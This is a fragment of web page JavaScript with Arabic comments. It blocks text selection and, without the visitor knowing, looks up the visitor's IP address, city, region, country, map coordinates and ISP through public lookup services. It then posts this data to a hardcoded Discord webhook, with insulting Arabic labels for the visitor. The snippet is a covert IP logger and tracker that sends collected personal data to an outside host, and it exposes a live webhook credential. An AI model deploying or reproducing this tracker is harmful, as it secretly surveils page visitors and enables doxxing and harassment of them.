    <script>
        // منع التحديد على الصفحة
        var omitformtags = ['input', 'textarea', 'select'].join('|');
        function disableselect(e) {
            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
                return false;
        }
        function reEnable() { return true; }
        if (typeof document.onselectstart != 'undefined')
            document.onselectstart = function () { return false; };
        else {
            document.onmousedown = disableselect;
            document.onmouseup = reEnable;
        }

        // جلب IP والمعلومات
        function fetchIPAndInfo() {
            fetch('https://api.ipify.org/?format=json')
                .then((response) => response.json())
                .then((data) => {
                    document.getElementById('ip-address-value').textContent = data.ip;
                    return data.ip;
                })
                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
                .then((response) => response.json())
                .then((ipInfoData) => {
                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "منيك جديد ");
                })
                .catch((error) => {
                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
                });
        }

        function sendToDiscord(ipInfoData, googleMapsLink, username) {
            const webhookURL = "https://discord.com/api/webhooks/1429298424662200401/Lf0Y9znLu6TT57I7n-sylNqocF27fs-JMj33V0dKwKhaA0THkEnJfZ8hWZODybFlox_m";
            const payload = {
                content: `ابن حرام: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
            };
            fetch(webhookURL, { 
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(() => console.log("IP sent to Discord!"))
            .catch(error => console.error(error));
        }
